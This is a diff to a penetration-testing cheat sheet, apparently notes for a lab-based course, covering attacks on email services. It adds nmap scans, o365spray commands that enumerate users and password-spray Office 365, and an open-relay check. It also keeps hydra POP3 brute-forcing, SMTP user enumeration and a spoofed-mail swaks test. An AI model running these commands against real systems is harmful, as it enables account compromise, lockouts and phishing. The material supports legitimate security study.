@@ -1142,9 +1142,10 @@ The can-i-take-over-xyz repository is also an excellent reference for a subdomai
 > ping inlanefreight.com
 
 ```
-# DNS lookup for mail servers for the specified domain
 ##### Attacking Email Services
 ```
+sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+
 # DNS lookup for mail servers for the specified domain
 host -t MX microsoft.com
 
@@ -1154,16 +1155,23 @@ dig mx inlanefreight.com | grep "MX" | grep -v ";"
 #  DNS lookup of the IPv4 address for the specified subdomain.
 host -t A mail1.inlanefreight.htb.
 
-# Connect to the SMTP server.
+# Connect to the SMTP server. >>> VRFY, EXPN, and RCPT TO, USER 
 telnet 10.10.110.20 25
 
 # SMTP user enumeration using the RCPT command against the specified host
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
+# Enum for cloud mail services
+o365spray or MailSnipery for  Microsoft Office 365 (O365), or CredKing for Gmail or Okta
+python3 o365spray.py --validate --domain msplaintext.xyz
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
 # Brute-forcing the POP3 service.
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
 # Testing the SMTP service for the open-relay vulnerability.
+nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
 ```
 ## Active Directory
